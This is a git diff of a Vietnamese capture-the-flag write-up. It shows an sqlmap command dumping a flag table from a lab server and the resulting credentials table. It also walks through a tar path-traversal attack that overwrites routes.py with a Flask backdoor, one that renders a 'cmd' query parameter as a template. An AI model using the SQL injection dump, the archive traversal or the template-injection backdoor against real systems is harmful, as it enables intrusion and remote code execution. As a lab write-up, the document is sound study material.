@@ -16,6 +16,12 @@ Sau khi biết được tên của db:
 
 Dump data:
 `sqlmap --dbms=mysql -u "http://54.169.55.172:1001/" --data "username=admin" -D "ctf" -T "flag" --dump`
+
+Flag: PISCTF{qs89QdAs9A}
+# firmware
+- Thoạt đầu nhìn vô bài này thì tricky hơn các bài trên, nhưng chúng ta có thể đoán được là mình cần tạo payload bằng file tar.gz để inject
+- Phân tích code:
+```
 +----+------------+-------------------+----------+
 | id | pass       | email             | username |
 +----+------------+-------------------+----------+
@@ -23,11 +29,7 @@ Dump data:
 | 2  | mypass     | michael@gmail.net | michael  |
 | 3  | qs89QdAs9A | admin@gmail.net   | admin    |
 +----+------------+-------------------+----------+
-Flag: PISCTF{qs89QdAs9A}
-# firmware
-- Thoạt đầu nhìn vô bài này thì tricky hơn các bài trên, nhưng chúng ta có thể đoán được là mình cần tạo payload bằng file tar.gz để inject
-- Phân tích code:
-
+```
 ```python
 import tarfile, tempfile, os
 from application import main
@@ -69,7 +71,7 @@ def extract_from_archive(file):
 - Và nghiên cứu thêm, thì tarfile có lỗ hổng bảo mật khi không check path traversal
 nên chúng ta có thể có file tar với folder như "../../../abc/abc" thì lúc gọi extractall, nó sẽ extract vô folder mà ta muốn
 - Vậy thì ý tưởng là chúng ta sẽ ghi đè 1 file trong application, ở đây mình ghi đè file routes.py, để mở backdoor cho chúng ta lấy flag
-
+```python
 
     from flask import Blueprint, request, render_template, abort, render_template_string
     from application.util import extract_from_archive
@@ -98,6 +100,7 @@ nên chúng ta có thể có file tar với folder như "../../../abc/abc" thì 
             return render_template_string(request.args.get('cmd'))
         except:
             return "Exit"
+```
 Sau đó làm sao để forge file tar, thì sau khi Google 1 hồi mình tìm có 2 cách:
 - 1 là dùng absolute name trong tar trên kali
 - 2 dùng script: https://github.com/ptoomey3/evilarc
